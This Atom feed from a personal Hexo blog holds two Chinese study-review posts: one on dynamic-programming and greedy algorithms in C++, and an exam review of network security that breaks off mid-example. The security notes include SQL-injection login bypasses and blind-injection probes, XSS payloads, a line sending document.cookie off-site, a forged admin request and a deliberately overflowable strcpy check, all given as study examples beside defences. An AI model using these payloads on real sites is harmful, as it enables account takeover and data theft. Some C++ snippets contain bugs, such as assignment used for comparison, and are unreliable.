<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Snail</title>
  
  <subtitle>everbodyup</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-23T07:15:58.158Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Jason_xi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>算法复习</title>
    <link href="http://yoursite.com/2018/11/23/%E7%AE%97%E6%B3%95%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/11/23/算法复习/</id>
    <published>2018-11-23T07:02:05.214Z</published>
    <updated>2018-11-23T07:15:58.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h2 id="0-1背包"><a href="#0-1背包" class="headerlink" title="0-1背包"></a>0-1背包</h2><p><img src="https://i.imgur.com/ctQOal9.png" alt=""></p><pre><code>#include &lt;iostream&gt;#include&lt;algorithm&gt;int b[1005][1005];using namespace std;struct Bag {int cost, val;}m[1005];int main(){int t, c, n;cin &gt;&gt; t;while (t--) {    cin &gt;&gt; c &gt;&gt; n;    for (int i = 1; i &lt;=n; i++) {        cin &gt;&gt; m[i].cost &gt;&gt; m[i].val;    }    for (int i = n; i &gt;= 1; i--) {        for (int j = 0; j &lt;= c; j++) {            if (j &gt;= m[i].cost) {                b[i][j] = max(b[i + 1][j], b[i + 1][j - m[i].cost] + m[i].val);            }            else {                b[i][j] = b[i + 1][j];            }        }    }    cout &lt;&lt; b[1][c] &lt;&lt; endl;}return 0;</code></pre><p>}</p><h2 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h2><p><img src="https://i.imgur.com/KiQfnyx.png" alt=""></p><pre><code>#include &lt;iostream&gt;#include&lt;algorithm&gt;#define maxn 0xffffffint p[100];int m[100][100] = {0};using namespace std;int main(){int n;cin &gt;&gt; n;for (int i = 0; i &lt;= n; i++) {    cin &gt;&gt; p[i];}for (int r = 2; r &lt;= n; r++) //层数{    for (int i = 1; i &lt;= n - r + 1; i++) {        int j = i + r - 1;        m[i][j] = maxn;        for (int k = i; k &lt; j; k++) {            m[i][j] =min(m[i][j],m[i][k] + m[k + 1][j] + p[i - 1] * p[k] * p[j]);        }    }}cout &lt;&lt; m[1][n] &lt;&lt; endl;}</code></pre><h2 id="最大字段和"><a href="#最大字段和" class="headerlink" title="最大字段和"></a>最大字段和</h2><p>给出一个整数数组a(正负数都有)，如何找出一个连续子数组（可以一个都不取，那么结果为0），使得其中的和最大？</p><p>例如：-2,11,-4,13,-5,-2，和最大的子段为：11,-4,13。和为20。<br>输入</p><p>第1行：整数序列的长度N（2 &lt;= N &lt;= 50000)<br>第2 - N + 1行：N个整数（-10^9 &lt;= A[i] &lt;= 10^9）</p><p>输出</p><p>输出最大子段和。</p><p>输入示例</p><p>6<br>-2<br>11<br>-4<br>13<br>-5<br>-2<br>输出示例 </p><p>20</p><pre><code>#include &lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int Maxsum(int a[], int n) {int b = 0, sum = 0;for (int i = 0; i &lt; n; i++) {    if (b &gt; 0)b +=a[i];    else {        b = a[i];    }    sum = max(b, sum);}return sum;}int main(){int a[100], n;while (cin &gt;&gt; n) {    for (int i = 0; i &lt; n; i++) {        cin &gt;&gt; a[i];    }    cout&lt;&lt;Maxsum(a, n)&lt;&lt;endl;}}</code></pre><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad” ,顺次选1，3，5个字符就构成子串” cad” ,现给定两个字符串，求它们的最长共公子串。</p><p>输入格式：第一行两个字符串用空格分开。</p><p>输出格式：最长子串的长度。</p><p>两个串的长度均小于2000</p><p>样例输入</p><p>abccd aecd<br>样例输出</p><p>3</p><pre><code>#include &lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;int main(){int m[100][100] = { 0 };string a, b;cin &gt;&gt; a &gt;&gt; b;for (int i = 1; i &lt;= a.length(); i++) {    for (int j = 1; j &lt;= b.length(); j++) {        if (a[i-1] = b[j-1]) {            m[i][j] = m[i - 1][j - 1] + 1;        }        else {            m[i][j] = max(m[i - 1][j], m[i][j - 1]);        }    }}cout &lt;&lt; m[a.length()][b.length()] &lt;&lt; endl;}</code></pre><h1 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h1><h2 id="活动安排"><a href="#活动安排" class="headerlink" title="活动安排"></a>活动安排</h2><p>描述：</p><p>理论上，Nova君是个大闲人，但每天还是有一大堆事要干，大作业啦，创新杯啦，游戏啦，出题坑人啦，balabala……然而精力有限，Nova君同一时间只能做一件事，并不能一心二用。假设现在有N项工作等待Nova君完成，分别在 Si 时刻开始，在 Ti 时刻结束，对于每项工作可以选择做或者不做，但不可以同时选择时间重叠的工作（即使是开始的瞬间和结束的瞬间重叠也是不允许的）。Nova君自然希望尽量多做一些事情，那么最多能做几件事呢</p><p>多组测试数据（数据组数不超过10），对于每组数据，第一行输入一个正整数N，代表可选的工作数量，接下来输入N行，每行两个正整数，代表第 i 个工作的开始时间 si 和结束时间 ti 。</p><p>5<br>1 3<br>2 5<br>4 7<br>6 9<br>8 10</p><p>对于每组数据，输出一行，为可完成的工作的最大数量。</p><pre><code>#include &lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;struct Time {int s, f;}m[1005];bool compare(Time a, Time b) {return a.f &lt; b.f;}int main(){int n;while (cin&gt;&gt;n){    for (int i = 0; i &lt; n; i++) {        cin &gt;&gt; m[i].s &gt;&gt; m[i].f;    }    sort(m, m + n,compare);    int k = 0;    int sum = 1;    for (int i = 1; i &lt; n; i++) {        if (m[k].f &lt;= m[i].s)        {            sum++;            k = i;        }    }    cout &lt;&lt; sum &lt;&lt; endl;}}</code></pre><h2 id="最优装载"><a href="#最优装载" class="headerlink" title="最优装载"></a>最优装载</h2><p>Description</p><p>有一批集装箱要装上一艘载重量为C的轮船。其中集装箱i的重量为wi。最优装载问题要求确定在装载体积不受限制的情况下，将尽可能多的集装箱装上轮船。</p><p>Input</p><p>输入的第一个为测试样例的个数T（ T &lt;= 100 ），接下来有T个测试样例。每个测试样例的第一行是一个整数n（ n &lt;= 1000 ）和一个非负数C（ C &lt;= 10000 ），分别表示集装箱的个数以及轮船的载重量。接下来有n行，每行一个非负数，表示每个集装箱的重量。</p><p>Output</p><p>输出最多装集装箱的个数和最终的承重量。</p><p>Sample Input</p><p>1<br>5 100<br>20<br>50<br>120<br>99<br>30</p><pre><code>#include &lt;iostream&gt;#include&lt;algorithm&gt;int m[1000];int x[100];using namespace std;void Load(int x[], int m[], int c, int n) {for (int i = 0; i &lt; n; i++){    if (m[i] &lt;= c)    {        x[i] = 1;        c -= m[i];    }}}bool compare(int x, int y) {return x &lt; y;}int main(){int t,n,c,sum=0;cin &gt;&gt; t;while (t--) {    cin &gt;&gt; n &gt;&gt; c;    for (int i = 0; i &lt; n; i++)    {        cin &gt;&gt; m[i];        x[i] = 0;    }    sort(m, m + n, compare);    Load(x, m, c, n);    for (int i = 0; i &lt; n; i++)    {        if (x[i])        {            cout &lt;&lt; m[i]&lt;&lt;&quot; &quot;;            sum += m[i];        }    }    cout &lt;&lt; endl;    cout &lt;&lt; sum &lt;&lt; endl;}}</code></pre><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p>临近开学了，大家都忙着收拾行李准备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 55 张试卷，其中 44 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 44 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了 4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><p>输入格式</p><p>测试数据包括多组。每组测试数据以两个整数 M,N(1\leq M\leq 20, 1\leq N\leq 10000)M,N(1≤M≤20,1≤N≤10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 MM 行，每行包括两个整数 T,V(1\leq T\leq N,0&lt;V&lt;10000)T,V(1≤T≤N,0&lt;V&lt;10000)，分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0\:000 结束。</p><p>输出格式</p><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 22 位</p><p>提示</p><p>float 的精度可能不够，你应该使用 double 类型。</p><p>样例输入</p><p>4 20<br>4 10<br>5 22<br>10 3<br>1 2<br>0 0<br>样例输出</p><p>37.00</p><pre><code>#include &lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;iomanip&gt;using namespace std;struct baggage {double v, t,vt;}b[1005];bool compare(baggage x, baggage y) {return x.vt &gt; y.vt;}int main(){int m, n;double sum = 0.0;while (cin &gt;&gt; m &gt;&gt; n){    if (m == 0 &amp;&amp; n == 0)    {        break;    }    for (int i = 0; i &lt; m; i++) {        cin &gt;&gt; b[i].t &gt;&gt; b[i].v;        b[i].vt = b[i].v / b[i].t;    }    sort(b, b + m, compare);    for (int i = 0; i &lt; m; i++) {        if (b[i].t &lt;= n) {            sum += b[i].v;            n -= b[i].t;        }        else {            sum += (b[i].vt*n);        }    }}    cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; sum &lt;&lt; endl;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;动态规划&quot;&gt;&lt;a href=&quot;#动态规划&quot; class=&quot;headerlink&quot; title=&quot;动态规划&quot;&gt;&lt;/a&gt;动态规划&lt;/h1&gt;&lt;h2 id=&quot;0-1背包&quot;&gt;&lt;a href=&quot;#0-1背包&quot; class=&quot;headerlink&quot; title=&quot;0-1背包&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全复习</title>
    <link href="http://yoursite.com/2018/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/11/14/网络安全复习/</id>
    <published>2018-11-14T10:16:41.611Z</published>
    <updated>2018-11-25T07:38:26.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><h2 id="安全主要威胁"><a href="#安全主要威胁" class="headerlink" title="安全主要威胁"></a>安全主要威胁</h2><ul><li>特洛伊木马</li><li>黑客攻击</li><li>内部、外部泄密</li><li>计算机病毒</li><li>信息丢失、篡改、销毁</li><li>内部、外部泄密</li><li>蠕虫</li><li>拒绝服务攻击</li><li>逻辑炸弹</li><li>后门、隐蔽通道</li></ul><h2 id="CIA三元组"><a href="#CIA三元组" class="headerlink" title="CIA三元组"></a>CIA三元组</h2><ul><li>机密性</li><li>完整性</li><li>可用性</li></ul><h2 id="网络攻击类型"><a href="#网络攻击类型" class="headerlink" title="网络攻击类型"></a>网络攻击类型</h2><h3 id="安全属性分5类"><a href="#安全属性分5类" class="headerlink" title="安全属性分5类:"></a>安全属性分5类:</h3><p>阻断、截取、篡改、伪造、重放攻击</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h3><ul><li>主动:伪装、回答、修改报文、拒绝服务。</li><li>被动攻击:报文内容泄露、通信分析。</li></ul><h2 id="OSI安全体系："><a href="#OSI安全体系：" class="headerlink" title="OSI安全体系："></a>OSI安全体系：</h2><h3 id="5类安全服务"><a href="#5类安全服务" class="headerlink" title="5类安全服务:"></a>5类安全服务:</h3><p>机密性、完整性、访问控制、不可否认、鉴别；  </p><h3 id="8种安全机制："><a href="#8种安全机制：" class="headerlink" title="8种安全机制："></a>8种安全机制：</h3><p>访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密   </p><hr><h1 id="第一章-攻击流程和渗透测试"><a href="#第一章-攻击流程和渗透测试" class="headerlink" title="第一章 攻击流程和渗透测试"></a>第一章 攻击流程和渗透测试</h1><h2 id="黑客攻击流程"><a href="#黑客攻击流程" class="headerlink" title="黑客攻击流程"></a>黑客攻击流程</h2><p><img src="https://i.imgur.com/Xmtwn9i.png" alt=""><br>踩点：确定目标地址范围、查询名字空间、收集信息<br>扫描：评估目标系统，识别监听业务<br>查点：识别目标系统上合法用户账户和保护力不够的共享资源<br>获取访问权：利用收集的足够数据，访问目标系统<br>提权：寻找系统完全控制<br>窃取信息:通过信息获取确定目标系统的入侵机制和途径<br>掩踪灭迹:擦除访问痕迹<br>创建后门：系统中留下后门和陷阱，为下次入侵创造条件<br>拒绝服务:无法取得特权，使用漏洞代码使目标系统瘫痪  </p><h2 id="搜索引擎技巧"><a href="#搜索引擎技巧" class="headerlink" title="搜索引擎技巧:"></a>搜索引擎技巧:</h2><ul><li>site: 具体网站  //site: cumt.edu.cn    </li><li>link:链接到URL网页 //link: cumt.edu.cn  </li><li>inurl:包含第一个关键词,其他在链接或网页文档 //inurl: cumt 计算机</li><li>allinurl:链接包含查询关键词  </li><li>allintitle&amp;intitle类似上   </li><li>related、cache、info等  //related:<a href="http://www.cumt.edu.com/index.html" target="_blank" rel="noopener">www.cumt.edu.com/index.html</a></li></ul><h2 id="渗透测试七个阶段："><a href="#渗透测试七个阶段：" class="headerlink" title="渗透测试七个阶段："></a>渗透测试七个阶段：</h2><ul><li>前期交互 </li><li>情报搜集</li><li>威胁建模 </li><li>漏洞分析</li><li>渗透攻击</li><li>后渗透攻击</li><li>报告</li></ul><p>分类：</p><ul><li><p>白盒测试（White-boxTesting，内部测试）：拥有组织机构的内部知识的情况下进行的渗透测试</p></li><li><p>灰盒测试（Gray-box Testing）</p></li><li><p>黑盒测试（Black-boxTesting，外部测试）：模拟一个对组织机构一无所知的攻击者所进行的渗透攻击<br><img src="https://i.imgur.com/c2bvuEQ.png" alt=""></p></li></ul><h2 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>确定目标地址范围、查询名字空间、收集信息</strong></p><h2 id="途径"><a href="#途径" class="headerlink" title="途径"></a>途径</h2><p>1.WHOIS查询：获得域名和IP地址注册信息<br>2.DNS查询：</p><ul><li>工具作用：</li></ul><p>nslookup(查询域名信息或诊断DNS服务器问题)、dig(域名解析)、fierce(暴力破解DNS)</p><ul><li>命令作用：</li></ul><p>host:主机名<->网际地址<br>traceroute:路由追踪</-></p><p>3.公开渠道获取信息<br>4.网络侦查   </p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>基本步骤：  </p><p>确定目标系统是否真实存在-&gt;确定目标系统上那些服务正在运行或监听-&gt;探查操作系统  </p><p>nmap:</p><pre><code>-sP：进行ping扫描-sn:  Ping Scan - disable port scan  #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）-sA （发送tcp的ack包进行探测，可以探测主机是否存活）-sS ：半开放扫描（非3次握手的tcp扫描）/*优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root/administrator权限执行*/-sT：3次握手方式tcp的扫描 #效率低，速度慢，不需要root-sU：udp端口的扫描 #如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢-sF：也是tcp的扫描一种，发送一个FIN标志的数据包-sX：圣诞树扫描-sN：空(NULL)扫描-sW：窗口扫描-sV：版本检测</code></pre><p>Nessus/OpenVAS:<br>主机扫描/端口扫描/OS识别/漏洞扫描</p><h2 id="查点"><a href="#查点" class="headerlink" title="查点"></a>查点</h2><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>识别目标系统上合法用户账户和保护力不够的共享资源。</p><h2 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h2><ul><li><p>用户账号名（用于随后的口令猜测攻击）</p></li><li><p>错误配置的共享资源（如不安全的文件共享）</p></li><li><p>具有已知安全性漏洞的旧版本软件（如存在远程缓冲区溢出的web服务器）</p><h3 id="旗标抓取"><a href="#旗标抓取" class="headerlink" title="旗标抓取"></a>旗标抓取</h3><p>telnet<br><code>telnet www.cumt.edu.cn 80</code><br>netcat<br><code>nc -v 163.com 80</code></p></li></ul><h1 id="第二章网络嗅探"><a href="#第二章网络嗅探" class="headerlink" title="第二章网络嗅探"></a>第二章网络嗅探</h1><ul><li>共享式局域网</li><li>交换式局域网（溢出攻击、ARP欺骗）</li></ul><p>嗅探软件工作机制:</p><ul><li>驱动程序支持<br>将网卡设置成混杂模式，捕获数据包并提交上层协议<br>软件处理</li><li>分组捕获过滤机制：<br>网卡上传的数据帧有两个去处：正常的协议栈或分组<br>捕获过滤模块，对于非本地的数据包，前者会丢弃，后<br>者则根据上层应用要求来决定是否丢弃</li></ul><p>网卡工作模式：</p><ul><li>广播:广播信息</li><li>组播:组播数据</li><li>单播：目的地址匹配本机MAC地址数据帧</li><li>混杂：接收一切数据帧</li></ul><p>网络监听的防御：<br>被动防御：</p><ul><li>采用安全的网络拓扑结构和数据加密技术（网络分段、VLAN、）</li><li>数据通道加密(SSH、SSL、VPN)</li><li>数据内容加密</li></ul><p>交换网络下防监听：</p><pre><code>1 不要把网络安全信任关系建立在单一的IP或MAC基础上，理想的关系应该建立在IP-MAC的对应关系上2 使用静态ARP或者IP-MAC对照表代替动态的ARP或者IP-MAC对应表——禁止自动更新，使用手动更新3 定期检查ARP请求：使用ARP监视工具如ARPWatch等监视并探测arp欺骗4 制定良好的安全管理策略，加强用户安全意识</code></pre><p>Winpcap基于混杂模式进行嗅探<br><img src="https://i.imgur.com/yHdzyKa.png" alt=""></p><h1 id="第三章口令破解与防御"><a href="#第三章口令破解与防御" class="headerlink" title="第三章口令破解与防御"></a>第三章口令破解与防御</h1><p>Windows:<br><strong>安全账户管理器SAM机制（C:\Windows\system32\config\SAM)</strong><br>1.SAM:<br>包含本地系统所有用户名和口令的Hash值 </p><p>2.口令Hash:<br>LM和NTLMv2</p><p>LM:</p><pre><code>1.将口令全部转换为大写2.添加NULL字符，直到口令长度等于14字符，并转化为二进制字符串3.将新口令拆分为两组7位打的字符串4.分别经过str_to_key()函数处理创建两个DES加密密钥，并未每一组添加奇偶校验位，创建出64位的密钥5.使用每个DES密钥加密一个预定义的魔术字符串，获得两个8字节的密文值6.密文值链接成16字节的值，即最终获得的LM哈希。</code></pre><p>缺陷：</p><pre><code>1.des算法密钥太短2.69^7种可能，可以暴力破解3.如果密码长度&lt;=7,则第二部分hash为固定值，因此很容易确定密码的长度范围。4.Hash值在通过网络发送到服务器的时候，没有进行salting操作，容易遭受中间人攻击和重放攻击。</code></pre><p>3.安全标示RID：在账号创建是被创建，账号删除时，RID也同时删除，及时用户名相同，每次创建时获得的RID也不同。</p><p>4.hash密码格式:<br>用户名:RID:LM-HASH值：NT-HASH值   </p><p><strong>Linux</strong>:<br>修改密码:passwd<br><strong>/etc/passwd：用户名及基本信息</strong><br><strong>/etc/shadow： 影子密码文件,加密过的密码及失效时间 </strong><br>/etc/group:所有组<br>/etc/gshadow:所有组的群组影子密码文件</p><ul><li>过去:单向函数crypt(),基于DES算法</li><li>现在：crypt16() 口令+salt=不同加密口令（md5)     MCF(模块化加密模式)</li></ul><h2 id="命令功能及使用"><a href="#命令功能及使用" class="headerlink" title="命令功能及使用"></a>命令功能及使用</h2><ul><li>chmod:修改文件权限位  </li><li>passwd/gpasswd 密码修改  </li><li>usermod/groupmod 用户账户修改   </li></ul><h1 id="第四章欺骗技术与防御"><a href="#第四章欺骗技术与防御" class="headerlink" title="第四章欺骗技术与防御"></a>第四章欺骗技术与防御</h1><h2 id="0x01-IP欺骗"><a href="#0x01-IP欺骗" class="headerlink" title="0x01 IP欺骗"></a>0x01 IP欺骗</h2><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>IP协议:非面向连接，连接依靠双方IP地址</p><p>IP欺骗的方式：<br>简单的IP地址更改:简单IP地址更改，<strong>盲目飞行攻击和单向攻击</strong><br>源路由攻击：<strong>确保目标主机返回的数据流</strong>，宽松源站LSR/严格源站SRS<br>TCP会话劫持：接管现存动态会话的过程。即攻击者替代原来的合法用户，同时监视并掌握会话内容（<strong>被冒充者会被迫下线</strong>）</p><p>序列号机制：<br>序列号用来说明接收方下一步将要接收的数据包的顺序,猜测 一个属于发送方的序列号和另一个属于接收方的应答号。</p><p>劫持过程</p><ul><li>发现攻击目标</li><li>确认动态会话</li><li><strong>猜测序列号</strong>(会话劫持关键)</li><li>使客户主机下线（DOS）</li><li>接管会话<h3 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h3></li><li>就其实现原理而言，任何使用Internet进行通信 的主机都有可能受到这种攻击</li><li>产生了简单适用的会话劫持攻击软件，技术门槛的 降低导致了很多“少年攻击者”的诞生.<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3>1.防范基本的IP欺骗</li><li>入口过滤：不允许外网的数据包使用单位内部地址作为源地址</li><li>出口过滤：内网到内网主机的流量不允许流出</li></ul><p>2.防范源路由欺骗<br>设置路由器禁用源路由</p><p>3.防范会话劫持<br>加密、安全协议(SSH而非Telnet)、对信息进行限制保护</p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ol><li>工作原理: IP地址=&gt;MAC地址（广播）  </li><li>ARP协议有ARP请求包和ARP应答包</li><li>主机和网关都有ARP缓存表，就是IP-MAC地址对，分静态和动态。(arp -a可进行查看)</li><li>ARP欺骗原理（中间人）：</li></ol><p><img src="https://i.imgur.com/22ig6XD.png" alt=""></p><h3 id="后果-1"><a href="#后果-1" class="headerlink" title="后果"></a>后果</h3><ul><li>导致同网段的其他用户无法正常上网.</li><li>嗅探交换式局域网内的所有数据包，从而获取敏感信息.</li><li>对信息进行篡改，修改重要信息，进而控制受害者会话.</li></ul><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul><li>MAC地址绑定</li><li>静态ARP缓存</li><li>ARP服务器</li><li>ARP欺骗防护软件(ARP防火墙)</li><li>隔离进行ARP欺骗的主机<br>arp记录设置成静态:<code>arp -s ip mac</code><h1 id="第五章Web欺骗与防御"><a href="#第五章Web欺骗与防御" class="headerlink" title="第五章Web欺骗与防御"></a>第五章Web欺骗与防御</h1></li></ul><h2 id="SQL注入攻击原理"><a href="#SQL注入攻击原理" class="headerlink" title="SQL注入攻击原理"></a>SQL注入攻击原理</h2><ol><li><p>利用Web应用对后台<strong>数据库查询语句</strong>处理存在的安全漏洞，提交一段精心构造的数据库查询代码，根据返回结果获取数据。（受影响系统：<strong>输入参数不检查和过滤的系统</strong>）</p></li><li><p>注入方法:<br>布尔型、时间延迟、报错型、可联合查询、多语句查询注入等</p></li><li><p>GET:提交信息显示在URL</p></li><li>POST:不显示</li><li>注入过程<br>假设查询语句<br><code>select * from users where userID=&#39;$name&#39; and userPasswd=&#39;$passwd&#39;</code></li></ol><p>可闭合单引号进行绕过</p><p><code>admin/1234567&#39; or &#39;1&#39;=&#39;1</code>或<code>admin/1234567&#39; or &#39;1&#39;=&#39;1&#39;#</code>或<br><code>admin&#39; or &#39;1&#39;=&#39;1&#39;#/1234567</code></p><h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><p>复习盲注:<br>1.测试漏洞</p><pre><code>and 1=2,and 1=1;</code></pre><p>2.猜字段</p><pre><code>and exists(select * from admin);and exists(select id from admim);and exists(select username from admin);and exists(select passwd from admin);</code></pre><p>3.猜用户名和长度</p><pre><code>and exists(select id from admin where id=1);and exists(select id from admin where len(username)=5 and id=1);and exists(select id from admin where len(passwd)=10 and id=1)</code></pre><p>4.猜测用户名</p><pre><code>and 1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;100)1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;50)</code></pre><p>折半查找<br>    当&lt;变=可确定ascii对应的字符<br>    and 1=(select id from (select * from admin where id=1) where username=’admin’;</p><h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ol><li>使用预编译语句，绑定变量</li><li>用户提交的数据和输入参数进行严格过滤(,’;select delete from union 等)</li><li>摒弃动态SQL语句，改用存储过程来访问和操作数据</li><li>使用安全函数:OWASP、ESAPI</li><li>最小权限原则</li></ol><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>原理：<br>攻击者往Web页面里插入恶意html代码，当用户浏览该网页时，嵌入其中的恶意代码被执行，达到特殊目的。<br>分类</p><ul><li>反射型XSS：需要主动点击</li><li>存储式XSS：脚本永久存储目标服务器数据库或文件</li><li>DOM型XSS：客户端浏览器对请求页面进行DOM渲染(不需要服务器解析响应，浏览器DOM解析触发)</li></ul><p>举例：</p><pre><code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;link&lt;/a&gt;构造 &#39;onclick=alert(&quot;xss&quot;)//构造 &#39;&gt;&lt;img src=# onerror=alert(&quot;xss&quot;)/&gt;&lt;&#39;</code></pre><p>发起条件：</p><ul><li>Web服务器允许用户在表格或编辑框中输入不相关<br>的字符</li><li>Web服务器存储并允许把用户输入显示在返回给终<br>端用户的页面上，而没有去除非法字符或者重新进行编码。</li></ul><p>跨站脚本攻击的两个条件：</p><ul><li>存在跨站脚本漏洞的web应用程序</li><li>用户点击连接或者访问某一页面</li></ul><h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><pre><code>&lt;a href&gt;=&quot;http://www.baidu.com&quot;&gt;baidu&lt;/A&gt;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;</code></pre><p>cookie发送远程代码<br><code>javascript: window.location=&#39;link?&#39;+document.cookie</code></p><p>论坛管理员修改权限操作<br><code>admin_user.asp?&amp;username=xxx&amp;membercode=yyy</code><br>先获取管理员权限后构造<br><code>&lt;img src=window.location=&#39;http://127.0.0.1/admin_user.asp?&amp;username=xxx&amp;membercode=yyy&#39;&gt;</code></p><h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><ol><li>对用户来说，教育为主。<br>注意可疑链接，可装入一些浏览器插件如Firefox的NoScript</li><li>Web应用开发者</li></ol><ul><li>对所有用户提交内容进行可靠的输入验证(URL、POST数据)</li><li>保护所有敏感的功能，以防被机器人自动执行或被第三方网站执行。(session标记、验证码)</li></ul><p>其他Web攻击类型：<br>CSRF、失效的身份认证和会话管理、不安全对象的直接引用、安全配置错误、敏感信息泄露、</p><h1 id="第六章缓冲区溢出漏洞"><a href="#第六章缓冲区溢出漏洞" class="headerlink" title="第六章缓冲区溢出漏洞"></a>第六章缓冲区溢出漏洞</h1><h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><p>向固定长度的缓冲区中写入超出其预定长度的内容，造成缓冲区数据溢出，从而覆盖缓冲区周围的内存空间。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>程序在内存存放形式：一段连续的内存块，包括代码段、数据段和堆栈段。</p><ul><li>代码段(.text)：程序的机器码和只读数据，只读。</li><li>数据段:已初始化(.data)和未初始化(.bss),编译时分配</li><li>堆栈段：堆(Heap)+栈(Stack)<br>堆：大小不固定，可动态扩张/缩减。堆内存释放由应用程序控制。<br>栈：运行时按需分配，先进后出。PUSH压栈，POP出栈。</li></ul><p>堆栈区别：</p><ul><li>分配和管理方式不同</li><li>产生碎片不同</li><li>生长方向不同</li></ul><ol><li>file offset:数据在PE文件中相对文件开头的偏移</li><li>Image Base:PE文件装入虚拟内存基地址</li><li>VA:PE文件指令被装入虚拟内存后的地址</li><li>RVA：VA相对于基址的偏移量</li><li>VA=Image Base + RVA</li></ol><p><code>file offset = RVA - section offset= VA - Image base - section offset</code></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出:"></a>栈溢出:</h2><p>ESP(extended stack pointer)：系统栈最上面栈帧的栈顶<br>EBP：系统栈最上面栈帧的栈底<br>EIP：指向下一条等待执行的指令地址</p><p>函数调用参数入栈顺序：<br>VC —_cdecl方式(由右至左) </p><p>函数入栈步骤：<br>参数入栈、返回地址入栈、代码区跳转、栈帧调整。</p><p>调用指令：</p><pre><code>push 参数2push 参数1call 函数地址(保存返回地址；跳转到调用函数入口)push ebp;move ebp,espsub esp,xxx 分配XXX字节栈区空间</code></pre><p>overflow基于下图去理解<br>代码如下：</p><pre><code>#include &lt;stdio.h&gt;#include&lt;string.h&gt;#define PASSWORD &quot;1234567&quot;int verify_password(char *password){int authenticated;char buffer[8];authenticated=strcmp(password,PASSWORD);strcpy(buffer,password);return authenticated;    }main(){int valid_flag=0;char password[1024];while(1){    printf(&quot;please input password:      &quot;);    scanf(&quot;%s&quot;,password);    valid_flag=verify_password(password);    if(valid_flag)    {        